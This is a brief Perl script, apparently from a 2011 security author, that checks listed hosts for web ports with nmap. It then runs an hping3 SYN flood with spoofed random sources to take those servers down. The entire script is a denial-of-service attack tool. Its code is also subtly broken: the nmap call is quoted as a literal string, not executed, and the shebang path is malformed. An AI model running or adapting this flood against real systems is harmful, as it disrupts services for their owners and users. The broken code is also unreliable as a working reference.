#!usr/bin/perl

# Copyright 2011 - Christopher M. Frenz
# This script is free software - it may be used, copied, redistributed
# and/or modified
# under the terms laid forth in the Perl Artistic License

@IPs=("192.168.1.2", "192.168.1.3");
$DoSTime=10;

foreach $IP(@IPs) {
	#back tick system calls return STDOUT to perl
	$nmap='nmap -sS $IP';
	if($nmap=~/(80|443)\/tcp/){
		$port=$1;
		print "$nmap\n\n";
		#system does not return STDOUT
		system("ulimit -t $DoSTime; hping3 --flood --rand-source -S -p $port $IP");
		print "$IP has been DoSed on $port\n\n";
	}
	else{
		print "$IP does not have a Web server to DoS\n\n";
	}
}